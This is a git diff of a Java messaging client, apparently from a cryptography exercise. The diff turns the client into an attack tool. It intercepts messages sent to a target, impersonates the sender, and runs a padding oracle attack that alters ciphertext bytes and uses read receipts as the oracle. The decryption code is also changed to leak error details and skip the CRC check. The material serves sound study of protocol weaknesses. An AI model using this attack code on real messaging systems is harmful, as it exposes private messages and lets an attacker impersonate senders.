@@ -43,9 +43,10 @@ public class MyClient {
             "usage: java -cp \"*:.\" MyClient\n" +
             " -p <arg>       server port (default 80)\n" +
             " -s <arg>       server name\n" +
-            " -u <arg>       username";
+            " -t <arg>       target username";
     private static String serverurl = null;
     private static String clientuser = null;
+    private static String target = null;
     private static int port = 80;
     private static CloseableHttpClient httpClient;
     private static PrivateKey skrsa;
@@ -59,70 +60,77 @@ public class MyClient {
             getCommandLineArgs(args);
             httpClient = HttpClientBuilder.create().build();
             rollRandomKeys();
-            register();
-            BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
-            System.out.println("Server connection successful. Type (h)elp for commands.");
-            boolean quit = false;
-            while (!quit) {
-                System.out.print("enter command> ");
-                String input = br.readLine();
-                switch (input.toLowerCase().split(" ", 2)[0]) {
-                    case "g": case "get": case "":
-                        processInbox();
-                        break;
-                    case "c": case "compose":
-                        sendMessage(getMessage(br), input.split(" ")[1]);
-                        break;
-                    case "f": case "fingerprint":
-                        fingerprint(input.split(" ")[1]);
-                        break;
-                    case "l": case "list":
-                        getUserList();
-                        break;
-                    case "genkeys":
-                        System.out.println("Generating a new keypair...");
-                        rollRandomKeys();
-                        register();
-                        break;
-                    case "h": case "help":
-                        System.out.println(helpstring);
-                        break;
-                    case "q": case "quit":
-                        System.out.println("Shutting down...");
-                        quit = true;
-                        break;
-                    case "a": case "attack":
-                        String target =  input.split(" ")[1];
-			JSONArray messages = null;
-                        while(true) {
-                            JSONObject obj = getRequest(serverurl + "/getMessages/" + target);
-                            messages = obj.getJSONArray("messages");
-                            if (messages.length() > 0) {
-				//System.out.println("gotem");
-                                break;
-                            }
-                        }
-                        
-                        System.out.println(messages.getJSONObject(0));
-                    default:
+
+            JSONArray messages = null;
+            String sender = null;
+            while(true) {
+                JSONObject obj = getRequest(serverurl + "/getMessages/" + target);
+                messages = obj.getJSONArray("messages");
+                if (messages.length() > 0) {
+                    sender = messages.getJSONObject(0).getString("senderID");
+                    System.out.println("Caught a message to " + target + " from " + sender); //hax
+                    break;
                 }
             }
+
+            clientuser = "" + sender.charAt(0);
+            register(); //register as first letter of sender name. "a" for alice
+            String msgToMaul = messages.getJSONObject(0).getString("message");
+
+            int found = huntForByte(msgToMaul, 17); //change the 17th byte until accepted by target (colon)
+            String baseMessage = maulMessage(msgToMaul, (byte) found, 17);
+
+            System.out.println("Begin padding oracle attack!");
+            int numbytes = getByteLength(baseMessage);
+            byte[] unknownpad = new byte[numbytes];
+            found = huntForByte(baseMessage, numbytes-1);
+            //found xor pad == 1, so found xor 1 == pad
+            System.out.println(found ^ 1);
+            byte ogCipher = getByte(baseMessage, numbytes-1);
+            byte ogPlaintext = (byte) (ogCipher ^ (found ^ 1));
+            System.out.println(ogPlaintext);
+
+
+
             httpClient.close();
+
         } catch (Exception e) {
             e.printStackTrace();
             System.exit(0);
         }
     }
 
-    private static void processInbox() throws IOException, NoSuchAlgorithmException, InvalidKeyException, SignatureException, NoSuchPaddingException, IllegalBlockSizeException, BadPaddingException, InvalidAlgorithmParameterException {
+    private static int huntForByte(String msgToMaul, int pos) throws NoSuchAlgorithmException, InvalidKeyException, SignatureException, IOException, NoSuchPaddingException, IllegalBlockSizeException, BadPaddingException, InvalidAlgorithmParameterException {
+        int found;
+        int hunter = -128;
+        while(true) {
+            String mauled = maulMessage(msgToMaul, (byte) hunter, pos);
+            sendRawMessage(mauled, target, hunter);
+
+            if (hunter % 100 == 0) {
+                //System.out.println("check at " + i);
+                found = processInbox();
+                if (found != -1) {
+                    System.out.println("Succeeded with " + found + "!");
+                    break;
+                }
+            }
+            hunter++;
+        }
+        return found;
+    }
+
+    private static int processInbox() throws IOException, NoSuchAlgorithmException, InvalidKeyException, SignatureException, NoSuchPaddingException, IllegalBlockSizeException, BadPaddingException, InvalidAlgorithmParameterException {
         JSONObject obj = getRequest(serverurl + "/getMessages/" + clientuser);
         JSONArray messages = obj.getJSONArray("messages");
         for (int i = 0; i < messages.length(); i++) {
-            receiveMessage(messages.getJSONObject(i));
+            int ret = receiveMessage(messages.getJSONObject(i));
+            if (ret != -1) return ret; // read receipt
         }
+        return -1; // no read receipt
     }
 
-    private static void receiveMessage(JSONObject messagejson) throws IOException, NoSuchAlgorithmException, InvalidKeyException, SignatureException, NoSuchPaddingException, IllegalBlockSizeException, BadPaddingException, InvalidAlgorithmParameterException {
+    private static int receiveMessage(JSONObject messagejson) throws IOException, NoSuchAlgorithmException, InvalidKeyException, SignatureException, NoSuchPaddingException, IllegalBlockSizeException, BadPaddingException, InvalidAlgorithmParameterException {
         String sender = messagejson.getString("senderID");
         int messageID = messagejson.getInt("messageID");
         String message = messagejson.getString("message");
@@ -131,11 +139,68 @@ public class MyClient {
         PublicKey senderpkrsa = pks[0];
         PublicKey senderpkdsa = pks[1];
         String textMessage = decryptMessage(sender, message, senderpkdsa);
-        if (!(textMessage.equals("") || textMessage.startsWith(">>>READMESSAGE "))) {
-            System.out.println(textMessage);
-            String recipt = ">>>READMESSAGE " + messageID;
-            sendMessage(recipt.getBytes(), sender);
+        System.out.println(textMessage);
+        if (!(textMessage.equals("") || textMessage.startsWith(">>>READMESSAGE ") || textMessage.startsWith("!!"))) {
+            //System.out.println(textMessage);
+            String receipt = ">>>READMESSAGE " + messageID;
+            sendMessage(receipt.getBytes(), sender);
+        } else if (textMessage.startsWith(">>>READMESSAGE ")) {
+            System.out.println("Got a receipt for " + textMessage.split(" ")[1]);
+            return Integer.parseInt(textMessage.split(" ")[1]);
         }
+
+        return -1;
+    }
+
+    private static byte getByte(String message , int pos) {
+        String[] encoded = message.split(" ");
+
+        Base64 base64 = new Base64();
+        byte[] C2 = base64.decode(encoded[1]);
+        return C2[pos];
+    }
+
+    private static int getByteLength(String message) {
+        String[] encoded = message.split(" ");
+
+        Base64 base64 = new Base64();
+        byte[] C2 = base64.decode(encoded[1]);
+        return C2.length;
+    }
+
+    private static String maulMessage(String message, byte mauling, int pos) throws NoSuchAlgorithmException, UnsupportedEncodingException, InvalidKeyException, SignatureException {
+        String[] encoded = message.split(" ");
+
+        Base64 base64 = new Base64();
+        byte[] C1 = base64.decode(encoded[0]);
+        byte[] C2 = base64.decode(encoded[1]);
+
+        C2[pos] = mauling;
+
+        byte[] C164 = new String(base64.encode(C1)).getBytes("UTF-8");
+        byte[] C264 = new String(base64.encode(C2)).getBytes("UTF-8");
+
+        //9 DSA signature sigma
+        Signature dsasig = Signature.getInstance("SHA1withDSA");
+        dsasig.initSign(skdsa);
+        byte[] tosig = concat(concat(C164, " ".getBytes("US-ASCII")), C264);
+        dsasig.update(tosig);
+        byte[] sigma = dsasig.sign();
+
+        //10 sigma64
+        byte[] sigma64 = new String(base64.encode(sigma)).getBytes("UTF-8");
+
+        //11 C164|| ||C264|| ||sigma64
+        byte[] Cbytes = concat(C164, concat(" ".getBytes("US-ASCII"), concat(C264, concat(
+                " ".getBytes("US-ASCII"), sigma64))));
+
+        /*System.out.println("~~~");
+        System.out.println(message);
+        System.out.println("---");
+        System.out.println(new String(Cbytes));*/
+
+
+        return new String(Cbytes);
     }
 
     private static void sendMessage(byte[] M, String recipient) throws IOException {
@@ -151,6 +216,14 @@ public class MyClient {
             payload.put("message", encryptedMessage);
             postRequest(serverurl + "/sendMessage/" + clientuser, payload);
         }
+    }
+
+    private static void sendRawMessage(String message, String recipient, int id) throws IOException {
+        JSONObject payload = new JSONObject();
+        payload.put("recipient", recipient);
+        payload.put("messageID", id);
+        payload.put("message", message);
+        postRequest(serverurl + "/sendMessage/" + clientuser, payload);
     }
 
     private static String decryptMessage(String sender, String message, PublicKey senderpkdsa) {
@@ -170,7 +243,7 @@ public class MyClient {
             dsasig.initVerify(senderpkdsa);
             dsasig.update(message.substring(0, message.lastIndexOf(" ")).getBytes());
             boolean verified = dsasig.verify(sigma);
-            if (!verified) return "";
+            if (!verified) return "!!Sig verify failed!!";
 
             //5 RS decrypt C1 -> K
             Cipher rsacipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
@@ -189,7 +262,7 @@ public class MyClient {
             int padding = Mpadded[Mpadded.length - 1];
             for (int j = 0; j < padding; j++) {
                 if (Mpadded[Mpadded.length - j - 1] != padding) {
-                    return "";
+                    return "!!Manual padding check failed!!";
                 }
             }
             byte[] Mcrc = Arrays.copyOfRange(Mpadded, 0, Mpadded.length - padding);
@@ -201,17 +274,18 @@ public class MyClient {
             crc32.update(Mformatted, 0, Mformatted.length);
             boolean crcmatch = Arrays.equals(crc,
                     Arrays.copyOfRange(longToBytes(crc32.getValue()), 4, 8));
-            if (!crcmatch) return "";
+            //if (!crcmatch) return "!!CRC check failed!!";
 
             //9 verify sender, get message!
             String mfstring = new String(Mformatted);
             String claimedsender = mfstring.substring(0, mfstring.indexOf(':'));
-            if (!sender.equals(claimedsender)) return "";
+            if (!sender.equals(claimedsender)) return "!!Sender check failed!!~~~~~~\n" + mfstring;
             String textmessage = mfstring.substring(mfstring.indexOf(':') + 1, mfstring.length());
             return textmessage;
         } catch (Exception e) {
             //Silent abort
-            return "";
+            return "!!" + e;
+            //return "!!Exception!!";
         }
     }
 
@@ -472,13 +546,13 @@ public class MyClient {
                 case "-s":
                     serverurl = args[++i];
                     break;
-                case "-u":
-                    clientuser = args[++i];
+                case "-t":
+                    target = args[++i];
                     break;
                 default:
             }
         }
-        if (serverurl == null || clientuser == null) {
+        if (serverurl == null || target == null) {
             System.out.println(usage);
             System.exit(0);
         }
